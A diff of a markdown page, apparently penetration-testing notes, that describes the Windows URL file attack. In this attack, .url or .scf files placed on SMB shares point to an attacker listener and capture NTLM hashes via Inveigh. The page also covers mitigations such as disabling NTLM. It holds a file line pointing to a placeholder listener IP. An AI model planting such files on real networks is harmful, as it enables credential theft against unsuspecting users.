@@ -1,11 +1,3 @@
----
-date: 
-tags:
-  - Windows
----
-
-# URL File Attack
-
 ## Description
 
 A URL file attack is a type of network-based exploit that manipulates certain file formats to deceive systems into revealing sensitive information, such as NTLM hashes. This attack exploits the behaviour of URL files (.url), shell command files (.scf), and other file types to initiate connections to an adversary-controlled listener.
@@ -49,7 +41,6 @@ URL=\\[Listener-IP]\share
 * Local Administrator (If using Inveigh to capture hashes)
 * Write permissions over a SMB share
 
-
 Load Inveigh and configure listener
 
 ```powershell
@@ -86,7 +77,6 @@ From this point, various opportunity exists to perform further compromise. The c
 Disabling NTLM authentication within the domain is the most effective defence against this type of attack and other NTLM coercion-based attacks. However, it is understandable that disabling NTLM authentication within an enterprise may not be easily or quickly achievable for many organizations. In such cases, additional mitigations can be implemented. While these additional measures may not completely eliminate the attack vector, they can offer a degree of protection against this type of attack.
 
 Reference: [https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787)
-
 
 **Audit and restrict SMB share permissions**
 
